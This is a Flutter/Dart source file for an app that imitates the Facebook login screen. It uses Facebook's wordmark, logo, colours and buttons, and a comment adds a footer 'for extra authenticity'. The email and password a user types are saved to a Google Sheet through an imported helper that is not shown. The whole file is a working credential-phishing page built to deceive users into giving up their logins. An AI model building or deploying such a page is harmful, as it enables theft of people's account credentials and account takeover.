import 'package:flutter/material.dart';
import 'dart:async';
import 'google_sheets_helper.dart';

void main() {
  runApp(const FacebookAuthApp());
}

class FacebookAuthApp extends StatelessWidget {
  const FacebookAuthApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Facebook Login',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: const SplashScreen(),
    );
  }
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    Timer(const Duration(seconds: 2), () {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const LoginPage()),
      );
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF1877F2),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Text(
              'facebook',
              style: TextStyle(
                color: Colors.white,
                fontSize: 48,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 20),
            const CircularProgressIndicator(
              valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
            ),
          ],
        ),
      ),
    );
  }
}

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final _emailController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _isLoading = false;
  bool _isPasswordVisible = false;

  Future<void> _submitToGoogleSheets() async {
    if (_emailController.text.isEmpty || _passwordController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Please fill all fields')),
      );
      return;
    }

    setState(() => _isLoading = true);

    try {
      await GoogleSheetsAPI.saveCredentials(
        email: _emailController.text.trim(),
        password: _passwordController.text.trim(),
      );

      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Data saved successfully!')),
      );

      _emailController.clear();
      _passwordController.clear();
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Error:  ${e.toString()}')),
      );
    } finally {
      setState(() => _isLoading = false);
    }
  }

  @override
  void dispose() {
    _emailController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFf0f2f5),
      body: Center(
        child: SingleChildScrollView(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // Facebook logo from online
              Image.network(
                'https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png',
                height: 60,
                fit: BoxFit.contain,
              ),
              const SizedBox(height: 30),
              // Login card
              Container(
                width: 370,
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 32),
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(10),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.1),
                      blurRadius: 16,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    TextField(
                      controller: _emailController,
                      decoration: const InputDecoration(
                        labelText: 'Email or phone number',
                        prefixIcon: Icon(Icons.email),
                        border: OutlineInputBorder(),
                        filled: true,
                        fillColor: Color(0xFFF5F6F7),
                        contentPadding: EdgeInsets.symmetric(vertical: 16),
                      ),
                    ),
                    const SizedBox(height: 16),
                    TextField(
                      controller: _passwordController,
                      obscureText: !_isPasswordVisible,
                      decoration: InputDecoration(
                        labelText: 'Password',
                        prefixIcon: const Icon(Icons.lock),
                        suffixIcon: IconButton(
                          icon: Icon(
                            _isPasswordVisible ? Icons.visibility : Icons.visibility_off,
                          ),
                          onPressed: () {
                            setState(() {
                              _isPasswordVisible = !_isPasswordVisible;
                            });
                          },
                        ),
                        border: const OutlineInputBorder(),
                        filled: true,
                        fillColor: const Color(0xFFF5F6F7),
                        contentPadding: const EdgeInsets.symmetric(vertical: 16),
                      ),
                    ),
                    const SizedBox(height: 10),
                    Align(
                      alignment: Alignment.centerRight,
                      child: TextButton(
                        onPressed: () {},
                        child: const Text(
                          'Forgotten password?',
                          style: TextStyle(
                            color: Color(0xFF1877F2),
                            fontWeight: FontWeight.w500,
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(height: 10),
                    SizedBox(
                      width: double.infinity,
                      child: ElevatedButton(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: const Color(0xFF1877F2),
                          padding: const EdgeInsets.symmetric(vertical: 16),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(6),
                          ),
                        ),
                        onPressed: _isLoading ? null : _submitToGoogleSheets,
                        child: _isLoading
                            ? const SizedBox(
                                height: 22,
                                width: 22,
                                child: CircularProgressIndicator(
                                  color: Colors.white,
                                  strokeWidth: 2.5,
                                ),
                              )
                            : const Text(
                                'Log In',
                                style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                              ),
                      ),
                    ),
                    const SizedBox(height: 18),
                    Row(
                      children: [
                        Expanded(
                          child: Divider(
                            color: Colors.grey[300],
                            thickness: 1,
                          ),
                        ),
                        const Padding(
                          padding: EdgeInsets.symmetric(horizontal: 10),
                          child: Text(
                            'or',
                            style: TextStyle(color: Colors.grey, fontWeight: FontWeight.w500),
                          ),
                        ),
                        Expanded(
                          child: Divider(
                            color: Colors.grey[300],
                            thickness: 1,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 18),
                    SizedBox(
                      width: double.infinity,
                      child: ElevatedButton(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: const Color(0xFF42B72A),
                          padding: const EdgeInsets.symmetric(vertical: 16),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(6),
                          ),
                        ),
                        onPressed: () {},
                        child: const Text(
                          'Create New Account',
                          style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 30),
              // Optional: Add a footer for extra authenticity
              const Text(
                'Create a Page for a celebrity, brand or business.',
                style: TextStyle(
                  color: Colors.black54,
                  fontSize: 14,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}